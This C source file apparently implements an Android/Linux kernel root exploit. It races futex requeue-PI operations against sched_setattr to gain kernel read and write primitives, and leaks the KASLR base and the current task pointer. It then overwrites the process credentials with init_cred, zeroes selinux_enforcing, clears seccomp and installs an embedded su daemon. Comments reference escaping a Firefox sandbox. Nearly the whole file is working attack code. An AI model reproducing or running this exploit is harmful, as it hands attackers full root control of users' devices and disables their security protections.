#include "common.h"

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
uint64_t kaslr_base;
uint64_t kaslr_slide;

#define DIRECT_WRITE_ATTEMPTS 3

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);

  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
        int sched_errno = errno;
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        } else {
          pr_info("consumer sched_setattr seq=%d ret=%ld errno=%d tid=%d "
                  "fake_lock=%016zx fake_w0=%016zx\n",
                  seq, sched_ret, sched_errno, tid, fake_lock, fake_w0);
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
}

void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);

  while (!atomic_load(&route_done)) {
    usleep(10000);
  }
}

static int direct_read_boot_id_raw(unsigned char raw[16]) {
  char text[64];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("direct boot_id open failed errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, text, sizeof(text) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    pr_warning("direct boot_id read failed ret=%zd errno=%d\n",
               n, saved_errno);
    return 0;
  }
  text[n] = 0;

  int high = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int value = hex_value(text[i]);
    if (value < 0) {
      continue;
    }
    if (high < 0) {
      high = value;
    } else {
      raw[out++] = (unsigned char)((high << 4) | value);
      high = -1;
    }
  }
  if (out != 16) {
    pr_warning("direct boot_id parse failed bytes=%d ret=%zd\n", out, n);
    return 0;
  }
  return 1;
}

enum direct_r64_result {
  DIRECT_R64_FATAL = -1,
  DIRECT_R64_RETRY = 0,
  DIRECT_R64_OK = 1,
};

static int direct_pin_verify_cpu(
    const char *phase, const char *name, int attempt, int idx, int *cpu_out) {
  pin_to_core((size_t)direct_root_cpu);
  errno = 0;
  int cpu = sched_getcpu();
  int saved_errno = errno;
  if (cpu_out) {
    *cpu_out = cpu;
  }
  if (cpu != direct_root_cpu) {
    pr_error("direct-r64-fatal name=%s phase=%s attempt=%d idx=%d "
             "reason=cpu-mismatch expected_cpu=%u observed_cpu=%d errno=%d "
             "pid=%d tid=%ld\n",
             name, phase, attempt, idx, direct_root_cpu, cpu, saved_errno,
             getpid(), syscall(SYS_gettid));
    return 0;
  }
  return 1;
}

static int direct_read_shape0_exact64_once(
    uintptr_t q, uint64_t *value, const char *name,
    int attempt, int *write_idx) {
  const uintptr_t b = SLIDE_RANDOM_BOOT_ID_DATA;

  /*
   * Q1 是 KASLR 后的 image/data 地址，Q2 才是 direct-map 地址；因此这里
   * 只要求 Q 为内核指针，具体地址域由两个调用者分别收紧。
   */
  if (!value || !write_idx || !is_direct_ptr(b) || !is_kernel_ptr(q) ||
      (b & 7) != 0 || (q & 7) != 0 || q > UINTPTR_MAX - 16) {
    pr_error("direct-r64-fatal name=%s phase=precheck attempt=%d "
             "reason=bad-address B=%016zx Q=%016zx Q8=%016zx Q16=%016zx\n",
             name, attempt, b, q, q + 8, q + 16);
    return DIRECT_R64_FATAL;
  }

  int idx = (*write_idx)++;
  int cpu_before = -1;
  int cpu_after_trigger = -1;
  int cpu_after_read = -1;
  if (!direct_pin_verify_cpu(
          "before-shape0", name, attempt, idx, &cpu_before)) {
    return DIRECT_R64_FATAL;
  }

  pr_success("direct-r64-plan name=%s attempt=%d/%d idx=%d shape=0 "
             "cpu=%d pid=%d tid=%ld B=%016zx Q=%016zx Q8=%016zx Q16=%016zx\n",
             name, attempt, DIRECT_WRITE_ATTEMPTS, idx, cpu_before,
             getpid(), syscall(SYS_gettid), b, q, q + 8, q + 16);

  if (!direct_pselect_write_once(b, q, 0, idx)) {
    pr_warning("direct-r64-retry name=%s attempt=%d idx=%d "
               "reason=primitive-miss B=%016zx Q=%016zx\n",
               name, attempt, idx, b, q);
    return DIRECT_R64_RETRY;
  }

  /* 子进程退出后，父线程必须先回到 CPU7，才能读取 CPU7 的 __entry_task。 */
  if (!direct_pin_verify_cpu(
          "after-shape0", name, attempt, idx, &cpu_after_trigger)) {
    return DIRECT_R64_FATAL;
  }

  unsigned char raw[16] = {0};
  if (!direct_read_boot_id_raw(raw)) {
    pr_error("direct-r64-fatal name=%s phase=proc-read attempt=%d idx=%d "
             "reason=read-or-parse-failed triggered=1 B=%016zx Q=%016zx\n",
             name, attempt, idx, b, q);
    return DIRECT_R64_FATAL;
  }

  if (!direct_pin_verify_cpu(
          "after-proc-read", name, attempt, idx, &cpu_after_read)) {
    return DIRECT_R64_FATAL;
  }

  uint64_t got = 0;
  uint64_t sidecar = 0;
  memcpy(&got, raw, sizeof(got));
  memcpy(&sidecar, raw + 8, sizeof(sidecar));
  unsigned int expected_raw8 = (unsigned int)(b & 0xff);
  int oracle_ok = sidecar == (uint64_t)b && raw[8] == expected_raw8;

  pr_success("direct-r64-oracle name=%s attempt=%d idx=%d shape=0 "
             "cpu_before=%d cpu_after_trigger=%d cpu_after_read=%d "
             "value=%016llx sidecar=%016llx expected_sidecar=%016zx "
             "raw8=%02x expected_raw8=%02x ok=%d\n",
             name, attempt, idx, cpu_before, cpu_after_trigger, cpu_after_read,
             (unsigned long long)got, (unsigned long long)sidecar, b,
             (unsigned int)raw[8], expected_raw8, oracle_ok);
  if (!oracle_ok) {
    pr_error("direct-r64-fatal name=%s phase=oracle attempt=%d idx=%d "
             "reason=shape0-poststate-mismatch triggered=1\n",
             name, attempt, idx);
    return DIRECT_R64_FATAL;
  }

  *value = got;
  return DIRECT_R64_OK;
}

static int direct_trigger_write64(
    const char *name, uintptr_t target, uintptr_t value,
    int shape, int *write_idx) {
  for (int attempt = 1; attempt <= DIRECT_WRITE_ATTEMPTS; attempt++) {
    int idx = (*write_idx)++;
    pr_success("direct-step %s attempt=%d/%d target=%016zx value=%016zx\n",
               name, attempt, DIRECT_WRITE_ATTEMPTS, target, value);
    if (direct_pselect_write_once(target, value, shape, idx)) {
      return 1;
    }
  }
  return 0;
}

static int direct_trigger_write64_followup(
    const char *name, uintptr_t target, uintptr_t value, int shape,
    uintptr_t followup_target, int *write_idx) {
  int idx = (*write_idx)++;
  int followup_idx = *write_idx;
  *write_idx += DIRECT_WRITE_ATTEMPTS;
  pr_success("direct-step %s target=%016zx value=%016zx "
             "followup=%016zx\n",
             name, target, value, followup_target);
  return direct_pselect_write_followup_once(
      target, value, shape, idx, followup_target, followup_idx);
}

static int direct_read_enforcing_sysfs(void) {
  static const char *paths[] = {
    "/sys/fs/selinux/enforce",
    "/sys/fs/selinux/status",
  };
  for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
    char value[64];
    read_first_line(paths[i], value, sizeof(value));
    if (value[0] == '0' && (value[1] == 0 || value[1] == '\n' ||
                             value[1] == ' ' || value[1] == '\t')) {
      return 0;
    }
    if (value[0] == '1' && (value[1] == 0 || value[1] == '\n' ||
                             value[1] == ' ' || value[1] == '\t')) {
      return 1;
    }
    /* /sys/fs/selinux/status may contain "enforcing". */
    if (strstr(value, "enforcing") || strstr(value, "Enforcing")) {
      return 1;
    }
    if (strstr(value, "permissive") || strstr(value, "Permissive")) {
      return 0;
    }
  }
  return -1;
}

static int direct_read_enforcing_kernel(int *write_idx) {
  if (!write_idx || !kaslr_base) {
    return -1;
  }
  uintptr_t target = canon_addr(SELINUX_ENFORCING);
  if (!is_kernel_ptr(target) || (target & 3) != 0) {
    return -1;
  }
  /* Field is an int; read via 8-byte shape0 primitive and take low 32 bits. */
  uintptr_t q = target & ~7ULL;
  for (int attempt = 1; attempt <= DIRECT_WRITE_ATTEMPTS; attempt++) {
    uint64_t raw = 0;
    int rr = direct_read_shape0_exact64_once(
        q, &raw, "selinux_enforcing", attempt, write_idx);
    if (rr == DIRECT_R64_RETRY) {
      continue;
    }
    if (rr != DIRECT_R64_OK) {
      return -1;
    }
    uint32_t value;
    if ((target & 7) == 0) {
      value = (uint32_t)(raw & 0xffffffffULL);
    } else {
      value = (uint32_t)((raw >> 32) & 0xffffffffULL);
    }
    if (value == 0 || value == 1) {
      pr_success("direct-enforcing-kernel target=%016zx value=%u\n",
                 target, value);
      return (int)value;
    }
    pr_warning("direct-enforcing-kernel unexpected value=%u raw=%016llx\n",
               value, (unsigned long long)raw);
    return -1;
  }
  return -1;
}

static int direct_read_enforcing(int *write_idx) {
  int value = direct_read_enforcing_sysfs();
  if (value >= 0) {
    return value;
  }
  value = direct_read_enforcing_kernel(write_idx);
  if (value >= 0) {
    return value;
  }
  /*
   * untrusted_app cannot always open /sys/fs/selinux/enforce.  Assume
   * Enforcing=1 and continue: later stage still zeros SELINUX_ENFORCING
   * and reloads policy.
   */
  pr_warning("direct selinux enforce unreadable; assume enforcing=1\n");
  return 1;
}

static int direct_reload_selinux_policy(size_t *policy_size) {
  int policy_fd = open("/sys/fs/selinux/policy", O_RDONLY | O_CLOEXEC);
  if (policy_fd < 0) {
    return 0;
  }
  struct stat st;
  if (fstat(policy_fd, &st) != 0 || st.st_size <= 0 ||
      st.st_size > 32 * 1024 * 1024) {
    close(policy_fd);
    return 0;
  }
  size_t len = (size_t)st.st_size;
  unsigned char *policy = malloc(len);
  if (!policy) {
    close(policy_fd);
    return 0;
  }
  size_t done = 0;
  while (done < len) {
    ssize_t got = read(policy_fd, policy + done, len - done);
    if (got < 0 && errno == EINTR) {
      continue;
    }
    if (got <= 0) {
      free(policy);
      close(policy_fd);
      return 0;
    }
    done += (size_t)got;
  }
  close(policy_fd);

  int load_fd = open("/sys/fs/selinux/load", O_WRONLY | O_CLOEXEC);
  if (load_fd < 0) {
    free(policy);
    return 0;
  }
  ssize_t wrote;
  do {
    wrote = write(load_fd, policy, len);
  } while (wrote < 0 && errno == EINTR);
  int saved_errno = errno;
  close(load_fd);
  free(policy);
  errno = saved_errno;
  if (wrote != (ssize_t)len) {
    return 0;
  }
  if (policy_size) {
    *policy_size = len;
  }
  return 1;
}

/*
 * Extra kernel AAW after we already have uid=0 is the reboot risk window.
 * Only zero seccomp.mode/filter_count and seccomp.filter. Never RMW
 * thread_info.flags / atomic_flags here — wrong TIF bit or partial writes
 * panic this kernel.
 */
static int direct_clear_seccomp_minimal(uintptr_t task, int *write_idx) {
  if (!task || !write_idx) {
    return 0;
  }

  uintptr_t seccomp_base = task + TASK_SECCOMP_OFF;
  uintptr_t mode_count_slot = seccomp_base + SECCOMP_MODE_OFF;
  uintptr_t filter_slot = seccomp_base + SECCOMP_FILTER_OFF;

  pr_success("direct-step clear_seccomp_minimal task=%016zx "
             "mode_count@%016zx filter@%016zx\n",
             task, mode_count_slot, filter_slot);

  if ((mode_count_slot & 7) != 0 || (filter_slot & 7) != 0) {
    pr_warning("direct seccomp slots unaligned; skip clear\n");
    return 0;
  }

  if (!direct_trigger_write64(
          "seccomp_mode_count_zero", mode_count_slot, 0, 1, write_idx)) {
    pr_warning("direct seccomp mode/count clear failed\n");
    return 0;
  }
  if (!direct_trigger_write64(
          "seccomp_filter_null", filter_slot, 0, 1, write_idx)) {
    pr_warning("direct seccomp filter clear failed\n");
    return 0;
  }

  pr_success("direct-seccomp-clear minimal done task=%016zx\n", task);
  return 1;
}

static int direct_run_id(void) {
  pid_t child = fork();
  if (child < 0) {
    return 0;
  }
  if (child == 0) {
    execl("/system/bin/id", "id", (char *)NULL);
    _exit(127);
  }

  int status = 0;
  for (;;) {
    pid_t got = waitpid(child, &status, 0);
    if (got == child) {
      break;
    }
    if (got < 0 && errno == EINTR) {
      continue;
    }
    return 0;
  }
  return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static int run_direct_root_stage(void) {
  int write_idx = 0;

  pr_success("direct mode=init_cred runtime_cpu=%d\n", direct_root_cpu);
  pr_success("direct-step direct_root_enter uid=%u pid=%d\n",
             getuid(), getpid());

  int entry_cpu = -1;
  if (!direct_pin_verify_cpu(
          "root-enter", "root-stage", 0, write_idx, &entry_cpu)) {
    return 0;
  }
  pr_success("direct-root-parent cpu=%d pid=%d tid=%ld\n",
             entry_cpu, getpid(), syscall(SYS_gettid));

  uintptr_t percpu_base = canon_addr(PER_CPU_OFFSET);
  if (direct_root_cpu < 0 ||
      percpu_base > UINTPTR_MAX - (uintptr_t)direct_root_cpu * 8) {
    return 0;
  }
  uintptr_t percpu_slot =
      percpu_base + (uintptr_t)direct_root_cpu * sizeof(uint64_t);
  if (!is_kernel_ptr(percpu_slot) || (percpu_slot & 7) != 0) {
    pr_error("direct-percpu-fatal cpu=%d base=%016zx slot=%016zx\n",
             direct_root_cpu, percpu_base, percpu_slot);
    return 0;
  }

  uint64_t percpu_delta = 0;
  uintptr_t entry_slot = 0;
  for (int attempt = 1; attempt <= DIRECT_WRITE_ATTEMPTS; attempt++) {
    int rr = direct_read_shape0_exact64_once(
        percpu_slot, &percpu_delta, "per_cpu_offset", attempt, &write_idx);
    if (rr == DIRECT_R64_RETRY) {
      continue;
    }
    if (rr != DIRECT_R64_OK) {
      return 0;
    }

    entry_slot = canon_addr(ENTRY_TASK) + (uintptr_t)percpu_delta;
    int delta_aligned = (percpu_delta & (PAGE_SIZE - 1)) == 0;
    int entry_direct = is_direct_ptr(entry_slot);
    int entry_aligned = (entry_slot & 7) == 0;
    pr_success("direct-percpu cpu=%d base=%016zx slot=%016zx "
               "delta=%016llx page_aligned=%d entry_slot=%016zx "
               "direct=%d aligned=%d\n",
               direct_root_cpu, percpu_base, percpu_slot,
               (unsigned long long)percpu_delta, delta_aligned,
               entry_slot, entry_direct, entry_aligned);
    if (!delta_aligned || !entry_direct || !entry_aligned) {
      pr_error("direct-percpu-fatal reason=bad-derived-entry cpu=%d\n",
               direct_root_cpu);
      return 0;
    }
    break;
  }
  if (!entry_slot) {
    pr_error("direct per-cpu entry slot derivation failed cpu=%d\n",
             direct_root_cpu);
    return 0;
  }
  pr_success("direct entry_slot=%016zx cpu=%d delta=%016llx\n",
             entry_slot, direct_root_cpu,
             (unsigned long long)percpu_delta);

  uint64_t task = 0;
  for (int attempt = 1; attempt <= DIRECT_WRITE_ATTEMPTS; attempt++) {
    int rr = direct_read_shape0_exact64_once(
        entry_slot, &task, "entry_task", attempt, &write_idx);
    if (rr == DIRECT_R64_RETRY) {
      continue;
    }
    if (rr != DIRECT_R64_OK) {
      return 0;
    }

    int task_direct = task != 0 && is_direct_ptr((uintptr_t)task);
    int task_aligned = (task & 7) == 0;
    int cpu_now = sched_getcpu();
    pr_success("direct-entry cpu=%d observed_cpu=%d slot=%016zx "
               "task=%016llx direct=%d aligned=%d pid=%d tid=%ld\n",
               direct_root_cpu, cpu_now, entry_slot,
               (unsigned long long)task, task_direct, task_aligned,
               getpid(), syscall(SYS_gettid));
    if (cpu_now != direct_root_cpu ||
        !task_direct || !task_aligned) {
      pr_error("direct-entry-fatal reason=bad-task-or-cpu "
               "cpu=%d task=%016llx\n",
               cpu_now, (unsigned long long)task);
      return 0;
    }
    break;
  }
  if (!task) {
    pr_error("direct current task leak failed cpu=%d\n", direct_root_cpu);
    return 0;
  }
  pr_success("direct entry sample task=%016llx pid=%d cpu=%d\n",
             (unsigned long long)task, getpid(), direct_root_cpu);

  int enforcing = direct_read_enforcing(&write_idx);
  pr_success("direct pre-cred selinux preserved enforcing=%d\n", enforcing);

  uintptr_t init_cred = canon_addr(INIT_CRED);
  uintptr_t real_cred_slot = (uintptr_t)task + TASK_REAL_CRED_OFF;
  uintptr_t cred_slot = (uintptr_t)task + TASK_CRED_OFF;
  pr_success("direct-step before_init_cred uid=%u pid=%d task=%016llx "
             "real_cred@%016zx cred@%016zx init_cred=%016zx\n",
             getuid(), getpid(), (unsigned long long)task,
             real_cred_slot, cred_slot, init_cred);

  uintptr_t selinux_target = canon_addr(SELINUX_ENFORCING);
  pr_success("direct-step selinux_target=%016zx\n", selinux_target);
  if (!direct_trigger_write64(
          "install_real_cred", real_cred_slot, init_cred, 1, &write_idx)) {
    pr_error("direct real_cred install failed\n");
    return 0;
  }
  if (!direct_trigger_write64_followup(
          "install_cred_then_selinux_zero", cred_slot, init_cred, 1,
          selinux_target, &write_idx)) {
    pr_error("direct cred install failed\n");
    return 0;
  }

  if (!restore_initial_affinity()) {
    pr_warning("restore initial CPU affinity failed errno=%d\n", errno);
  }

  size_t policy_size = 0;
  int policy_ok = direct_reload_selinux_policy(&policy_size);
  if (!policy_ok) {
    pr_warning("direct selinux policy reload failed errno=%d; continue\n",
               errno);
  }
  int enforcing_after = direct_read_enforcing(&write_idx);
  pr_success("direct credential result uid=%u euid=%u gid=%u egid=%u "
             "task=%016llx init_cred=%016zx selinux=%d->%d "
             "policy_reload=%zu policy_ok=%d\n",
             getuid(), geteuid(), getgid(), getegid(),
             (unsigned long long)task, init_cred, enforcing, enforcing_after,
             policy_size, policy_ok);

  int id_ok = direct_run_id();

  /*
   * Stop racing the kernel once we are root. /data/local/tmp/su only needs
   * open/write/chmod which Firefox seccomp usually allows. Clearing seccomp
   * via more AAW is what rebooted this device after uid=0.
   */
  pid_t su_daemon_pid = -1;
  errno = 0;
  int su_ok = install_embedded_su(&su_daemon_pid);
  int su_errno = errno;
  pr_success("direct-su-first-pass ok=%d errno=%d daemon=%d uid=%u\n",
             su_ok, su_errno, su_daemon_pid, getuid());

  if (!su_ok) {
    pr_warning("local/apex su install failed; try minimal seccomp clear once\n");
    if (direct_clear_seccomp_minimal((uintptr_t)task, &write_idx)) {
      errno = 0;
      su_ok = install_embedded_su(&su_daemon_pid);
      su_errno = errno;
      pr_success("direct-su-second-pass ok=%d errno=%d daemon=%d\n",
                 su_ok, su_errno, su_daemon_pid);
    }
  }

  int root_ok = (getuid() == 0 && geteuid() == 0 && (id_ok || su_ok));
  pr_success("direct-root-summary root=%d id=%d su=%d/%d daemon=%d "
             "selinux=%d->%d uid=%u euid=%u gid=%u egid=%u\n",
             root_ok, id_ok, su_ok, su_errno, su_daemon_pid,
             enforcing, enforcing_after,
             getuid(), geteuid(), getgid(), getegid());
  return root_ok;
}

int run_exploit(int argc, char **argv) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  (void)argc;
  (void)argv;
  if (!init_direct_root_cpu()) {
    pr_error("runtime performance CPU detection failed errno=%d\n", errno);
    return 1;
  }
  log_startup_context();

  pin_to_core(CORE);
  if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
  }

  /*
   * slide 的 skb 已经被子进程消费，KASLR 也已读回；在父进程中释放本代
   * reclaim socket 与残留 mm pin，避免 direct worker 只关闭继承副本、
   * 而父进程仍把旧 partial slab 保活。
   */
  close_reclaim_sockets();
  cleanup_page_prepare_state();
  page_base = 0;
  fake_lock = 0;
  fake_w0 = 0;
  fake_task = 0;
  pr_info("slide generation released before direct stage\n");

  return run_direct_root_stage() ? 0 : 2;
}
